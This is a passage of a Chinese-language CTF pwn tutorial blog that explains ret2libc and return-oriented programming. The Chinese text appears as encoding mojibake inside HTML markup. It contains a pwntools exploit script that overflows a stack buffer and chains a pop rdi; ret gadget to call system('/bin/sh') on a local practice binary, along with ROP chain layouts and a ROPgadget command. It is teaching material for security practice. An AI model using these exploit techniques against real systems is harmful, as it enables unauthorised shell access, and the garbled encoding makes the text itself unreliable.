&lt;p&gt;&lt;code&gt;rdi&lt;/code&gt; å¯„å­˜å™¨ä¸­å­˜æ”¾ &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆ&lt;code&gt;0x7ffff79e5aaa&lt;/code&gt;ï¼‰ï¼›&lt;/p&gt;
&lt;p&gt;ç¨‹åºè·³è½¬åˆ° &lt;code&gt;system&lt;/code&gt; å‡½æ•°çš„åœ°å€ï¼ˆ&lt;code&gt;0x7ffff7839410&lt;/code&gt;ï¼‰æ‰§è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é€šè¿‡æ ˆæº¢å‡ºæ„é€  payloadï¼Œæœ€ç»ˆè®©ç¨‹åºæ‰§è¡Œ &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;ï¼Œè·å– shellã€‚&lt;/p&gt;
&lt;p&gt;ç”¨ Python ä»£ç ç”Ÿæˆ payloadï¼ˆpwntoolsï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€  payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;120&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è¦†ç›–åˆ°è¿”å›åœ°å€çš„åç§»é‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x401273&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# pop rdi; ret gadget åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x7ffff79e5aaa&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# &amp;#34;/bin/sh&amp;#34; åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x7ffff7839410&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# system å‡½æ•°åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;                &lt;span class=&#34;c1&#34;&gt;# å¡«å……åç§»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;# æ”¾å…¥ gadget åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;# æ”¾å…¥å‚æ•°åœ°å€ï¼ˆç»™ rdiï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;# æ”¾å…¥ system åœ°å€ï¼ˆè·³è½¬æ‰§è¡Œï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘é€ payload åˆ°ç¨‹åºï¼ˆå‡è®¾é€šè¿‡ç®¡é“è¿æ¥ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./vuln&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# äº¤äº’è·å– shell&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;ret2libc&lt;/code&gt; è°ƒç”¨ &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç”¨ &lt;code&gt;pop rdi; ret&lt;/code&gt; æŠŠæ ˆä¸­çš„ &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; åœ°å€ â€œæ¬â€ åˆ° &lt;code&gt;rdi&lt;/code&gt; å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ° &lt;code&gt;system&lt;/code&gt; å‡½æ•°&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æ•´ä¸ªè¿‡ç¨‹å®Œå…¨ä¾èµ–æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œé¡ºåºï¼Œä¸éœ€è¦ç¨‹åºä¸­å­˜åœ¨ç°æˆçš„ shell å‡½æ•°ï¼Œä¹Ÿä¸éœ€è¦æ ˆå¯æ‰§è¡Œï¼Œå› æ­¤é€‚ç”¨æ€§æå¼ºã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œå¼€å§‹å°±éœ€è¦åˆ·ç‚¹PWNé¢˜äº†ï¼Œæˆ‘æ¯”è¾ƒæ¨èçš„æ˜¯ctfshowï¼Œè´­ä¹°å®˜ç½‘å¥—é¤æˆ–è€…å»å’¸é±¼ä¸Šä¹°ç½‘ç›˜ä¿å­˜çš„ctfshow-pwné¢˜ä¹Ÿè¡Œï¼Œçœ‹è‡ªå·±é¢„ç®—ï¼Œåœ¨è¿™é‡Œæˆ‘å°±ä¼šåŒæ­¥è¿›è¡Œwriteup_pwnçš„ç¼–å†™äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;rop-å‰ä¼ &#34;&gt;ROP å‰ä¼ 
&lt;/h2&gt;&lt;p&gt;ROPï¼ˆReturn-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰æ˜¯ä¸€ç§é«˜çº§æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œä¸»è¦ç”¨äºåœ¨å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼ˆå¦‚ NX/DEPï¼Œå³ä»£ç æ®µä¸å¯æ‰§è¡Œï¼‰é™åˆ¶ä¸‹ï¼Œé€šè¿‡æ‹¼æ¥ç¨‹åºä¸­å·²æœ‰çš„ä»£ç ç‰‡æ®µï¼ˆç§°ä¸º â€œgadgetâ€ï¼‰æ¥æ„é€ æ”»å‡»é€»è¾‘ï¼Œå®ç°å¯¹ç¨‹åºçš„æ§åˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆå¤šæƒ…å†µä¸‹ï¼Œç¨‹åºä¸­æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„åªæœ‰æ ˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºä¸­æ²¡æœ‰ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸè®©æˆ‘ä»¬è¾“å…¥shellcodeã€‚åŒæ—¶ï¼Œå¤§å¤šæ•°é¢˜ç›®ä¹Ÿä¸ä¼šé‚£ä¹ˆå¥½å¿ƒç»™ä½ ç•™ä¸€ä¸ªåé—¨å‡½æ•°ç›´æ¥æ‰§è¡Œsystemã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±è¦åˆ©ç”¨ROPã€‚æˆ‘ä»¬ä¸èƒ½è¿è¡Œshellcodeï¼Œä¹Ÿæ²¡æœ‰åé—¨å‡½æ•°ä¸€æ­¥åˆ°ä½ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºä¸­çš„ä¸€äº›æŒ‡ä»¤ç‰‡æ®µï¼Œä¸€ç‚¹ç‚¹æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æˆæˆ‘ä»¬æƒ³è¦çš„æ ·å­ã€‚æ€ä¹ˆæ‹¼ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ‹¿system(&amp;quot;â€œ/bin/sh&amp;quot;);ä¸¾ä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦å°†rdiæ”¹æˆ/bin/shè¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œç„¶åcall systemã€‚ä¸èƒ½æ‰§è¡Œshellcodeï¼Œæ€ä¹ˆæ”¹ï¼Ÿæˆ‘ä»¬æœ‰æ ˆï¼ˆä¼ é€’å‚æ•°ï¼‰!  pop rdi ret + /bin/sh addr&lt;/p&gt;
&lt;p&gt;ä¸èƒ½shellcodeï¼Œæ€ä¹ˆcallï¼Ÿæˆ‘ä»¬æœ‰ret!
æ‰€ä»¥ï¼Œæˆ‘ä»¬æ„é€ çš„payloadå°±æ˜¯ï¼š
padding + pop rdi; ret + /bin/sh + system&lt;/p&gt;
&lt;p&gt;ROPå°±æ˜¯æ­ç§¯æœ¨ï¼Œç”¨ä¸€ä¸ªä¸ªå°å°çš„ç‰‡æ®µæ¥å®Œæˆå¤æ‚çš„å·¥ä½œï¼ŒåŸºæœ¬åªéœ€è¦ç”¨åˆ°æ ˆè¿™äº›å°å°çš„ç§¯æœ¨ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºgadgetæ€ä¹ˆæ‰¾gadgetå‘¢?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ropper &amp;amp; ROPgadgets&lt;/strong&gt;ï¼ˆè‡ªè¡Œå®‰è£…ï¼‰å¯ä»¥å¸®æˆ‘ä»¬å¯»æ‰¾&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary file 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¦‚æœè¦æ‰¾ç‰¹å®šå¯„å­˜å™¨æˆ–è€…è¿”å›å€¼ï¼Œå¯ä»¥åœ¨åé¢åŠ ï¼Œæ¯”å¦‚å›¾çš„æŒ‡ä»¤:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-2/2.png&#34;
	width=&#34;1265&#34;
	height=&#34;375&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-2/2_hu_5a7538fd605e720d.png 480w, https://expl0rer.top/p/pwn-2/2_hu_a866cc865737ff56.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;PWN_042çš„ç¤ºä¾‹ï¼šä½¿ç”¨ROPgadget&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;809px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¥ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;p&gt;read(0,buf,200);å‘bufä¸Šå†™æ•°æ®ï¼ˆ/bin/shï¼‰ï¼Œbufåœ°å€å·²çŸ¥ï¼›system(buf);å³æ‰§è¡Œsystem(&amp;quot;/bin/sh&amp;quot;)ï¼›&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;   //ç¬¬ä¸€ä¸ªå‚æ•°0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rsi&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;; //ç¬¬äºŒä¸ªå‚æ•° bufåœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdx&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;; //ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå†™å…¥çš„é•¿åº¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;   //è°ƒç”¨read&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rdi&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;; //ç¬¬ä¸€ä¸ªå‚æ•° bufåœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ROPä¼ å‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop rdi;retï¼›
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop rsi;ret;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;buf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop rdx;retï¼›
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;200
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;read
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pop rdi;ret;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;buf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemï¼›
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å¾ˆæŠ½è±¡ï¼Ÿé‚£æˆ‘ä»¬å¯ä»¥çœ‹å›è¿™ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-2/2.png&#34;
	width=&#34;1265&#34;
	height=&#34;375&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-2/2_hu_5a7538fd605e720d.png 480w, https://expl0rer.top/p/pwn-2/2_hu_a866cc865737ff56.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;PWN_042çš„ç¤ºä¾‹ï¼šä½¿ç”¨ROPgadget&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;809px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°é‡Œé¢çš„ä¸€äº›åœ°å€pop rdi;retä¹‹ç±»çš„ï¼Œå†çœ‹å›ä¸Šé¢çš„ï¼Œä½ å°±èƒ½è¯»æ‡‚æ˜¯ä»€ä¹ˆæ„æ€ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åœ¨å®é™…æƒ…å†µä¸‹ï¼Œå¹¶ä¸ä¸€å®šæœ‰åƒä¹‹å‰ä¸¾çš„ä¾‹å­ä¸€æ ·çš„gadgetä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸€ä¸ªgadget,æ¯”å¦‚poprsiï¼›ret,ç¨‹åºä¸­ä¸ä¸€å®šä¼šæœ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦è°ƒåŠ¨æˆ‘ä»¬çš„æ€ç»´èƒ½åŠ›ï¼Œæ›²çº¿æ•‘å›½ï¼Œé€šè¿‡åˆ«çš„æ–¹å¼æ¥å®ŒæˆROPã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;é€šç”¨ROPï¼š
åœ¨64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-2/3.png&#34;
	width=&#34;1065&#34;
	height=&#34;296&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-2/3_hu_d894993e4110c0f0.png 480w, https://expl0rer.top/p/pwn-2/3_hu_6bafde7ec4c92de7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ç¤ºä¾‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;359&#34;
		data-flex-basis=&#34;863px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨x64ä¸‹çš„libc_csu_init ä¸­çš„gadgetsã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æœ¬ç« çš„ROPä»‹ç»åˆ°è¿™å•¦ã€‚&lt;/p&gt;
&lt;h2 id=&#34;rop&#34;&gt;ROP++
&lt;/h2&gt;&lt;p&gt;é€šè¿‡ä¹‹å‰çš„è®¤è¯†ï¼Œæˆ‘ä»¬å‘ç°ROPå½¢å¼ä¸ŠæŠŠä»£ç ç‰‡æ®µåˆ†æ•£åœ¨ç¨‹åºä»£ç ä¸­ã€‚ROPé€šè¿‡æ ˆæ¥ç»´æŠ¤æ•´ä¸ªé“¾çš„é€»è¾‘ã€‚
ä½†å¦‚æœæ ˆæº¢å‡ºå­—èŠ‚ä¸å¤Ÿæ€ä¹ˆåŠï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ€è·¯ä¸€ï¼šone punch!&lt;/p&gt;
&lt;p&gt;libcä¸­æœ‰æ²¡æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼Œç›´æ¥å°±è¿è¡Œsystem(â€œ/bin/shâ€)å‘¢ï¼Ÿè¿™æ ·æˆ‘ä»¬å°±ä¸éœ€è¦ä¼ é€’å‚æ•°ï¼Œç›´æ¥å°†è¿”å›åœ°å€è¦†ç›–åˆ°é‚£é‡Œå°±å¥½äº†ã€‚
